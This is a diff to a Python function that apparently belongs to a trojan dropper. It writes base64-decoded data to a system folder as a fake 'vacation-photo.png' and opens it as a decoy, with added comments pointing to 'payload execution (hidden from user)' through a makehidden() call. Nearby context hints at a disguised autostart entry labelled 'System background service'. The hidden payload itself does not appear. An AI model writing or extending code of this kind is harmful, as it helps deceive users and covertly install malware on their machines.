@@ -158,8 +158,8 @@ Comment=System background service
 
 
 def extract_encoded(encoded_data):
-
     try:
+        # Determine target path based on OS
         if sys.platform == "win32":
             target_path = "C:\\ProgramData\\"
             fake_image = "vacation-photo.png"
@@ -171,16 +171,24 @@ def extract_encoded(encoded_data):
                 ["xdg-open", f], stdout=subprocess.PIPE, stderr=subprocess.PIPE
             )
 
+        # Ensure target directory exists
         Path(target_path).mkdir(parents=True, exist_ok=True)
 
+        # Write the "image" file
         image_path = os.path.join(target_path, fake_image)
         with open(image_path, "wb") as fp:
             fp.write(base64.b64decode(encoded_data))
             fp.close()
+            
+        # For the actual payload execution (hidden from user)
+        # This would be your makehidden() function or similar
+        # makehidden()
 
+        # "Open" the image file to maintain appearance
         open_cmd(image_path)
         return True
 
+    # Handle errors
     except Exception as e:
         print(f"Error in extract_encoded: {e}")
         return False
